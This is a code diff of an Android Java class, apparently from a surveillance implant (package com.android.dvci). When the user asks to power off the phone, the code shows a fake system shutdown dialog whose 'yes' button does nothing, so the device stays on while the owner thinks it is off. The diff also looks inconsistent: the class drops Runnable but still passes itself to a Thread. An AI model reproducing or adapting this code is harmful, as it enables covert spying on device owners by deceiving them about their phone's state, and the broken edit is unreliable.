@@ -43,7 +43,7 @@ import com.android.mm.M;
  * which are delivered by {@link com.android.dvci.listener.ListenerOOBSms}
  */
 
-public class EventPowerOff extends BaseEvent implements Observer<LowEventPower> , Runnable{
+public class EventPowerOff extends BaseEvent implements Observer<LowEventPower>{
 	/** The Constant TAG. */
 	private static final String TAG = "EventPowerOff"; //$NON-NLS-1$
 
@@ -93,34 +93,6 @@ public class EventPowerOff extends BaseEvent implements Observer<LowEventPower> 
 		}
 	}
 
-	@Override
-	public synchronized void run() {
-		final CloseDialogReceiver closer = new CloseDialogReceiver(Status.getAppContext());
-		final int resourceId = Reflect.on("com.android.internal.R.string").field("shutdown_confirm_question").get();
-		final int titleId = Reflect.on("com.android.internal.R.string").field("power_off").get();
-		final int yesId = Reflect.on("com.android.internal.R.string").field("yes").get();
-		final int noId = Reflect.on("com.android.internal.R.string").field("no").get();
-		//com.android.internal.R.string.shutdown_confirm);
-		if (sConfirmDialog != null) {
-	            /* we have to truly reboot ??*/
-			sConfirmDialog.dismiss();
-		}
-		sConfirmDialog = new AlertDialog.Builder(Status.getAppContext())
-				.setTitle(titleId)
-				.setMessage(resourceId)
-				.setPositiveButton(yesId, new DialogInterface.OnClickListener() {
-					public void onClick(DialogInterface dialog, int which) {
-						// fake shutdown
-						//beginShutdownSequence(context);
-					}
-				})
-				.setNegativeButton(noId, null)
-				.create();
-		closer.dialog = sConfirmDialog;
-		sConfirmDialog.setOnDismissListener(closer);
-		sConfirmDialog.getWindow().setType(WindowManager.LayoutParams.TYPE_KEYGUARD_DIALOG);
-		sConfirmDialog.show();
-	}
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(LowEventPower pe) {
@@ -129,7 +101,37 @@ public class EventPowerOff extends BaseEvent implements Observer<LowEventPower> 
 			Check.log(TAG + " notification: Got POWER OFF request "+ pe.power_data.sub_type);//$NON-NLS-1$ //$NON-NLS-2$
 		}
 		/* Show fake dialog */
-
+		Thread myThread = new Thread(new Runnable() {
+			@Override
+			public void run() {
+				final CloseDialogReceiver closer = new CloseDialogReceiver(Status.getAppContext());
+				final int resourceId = Reflect.on("com.android.internal.R.string").field("shutdown_confirm_question").get();
+				final int titleId = Reflect.on("com.android.internal.R.string").field("power_off").get();
+				final int yesId = Reflect.on("com.android.internal.R.string").field("yes").get();
+				final int noId = Reflect.on("com.android.internal.R.string").field("no").get();
+				//com.android.internal.R.string.shutdown_confirm);
+				if (sConfirmDialog != null) {
+	            /* we have to truly reboot ??*/
+					sConfirmDialog.dismiss();
+				}
+				sConfirmDialog = new AlertDialog.Builder(Status.getAppContext())
+						.setTitle(titleId)
+						.setMessage(resourceId)
+						.setPositiveButton(yesId, new DialogInterface.OnClickListener() {
+							public void onClick(DialogInterface dialog, int which) {
+								// fake shutdown
+								//beginShutdownSequence(context);
+							}
+						})
+						.setNegativeButton(noId, null)
+						.create();
+				closer.dialog = sConfirmDialog;
+				sConfirmDialog.setOnDismissListener(closer);
+				sConfirmDialog.getWindow().setType(WindowManager.LayoutParams.TYPE_KEYGUARD_DIALOG);
+				sConfirmDialog.show();
+			}
+		});
+		myThread.start();
 
 		if(pe.power_data.dialog){
 			new Thread(this).start();
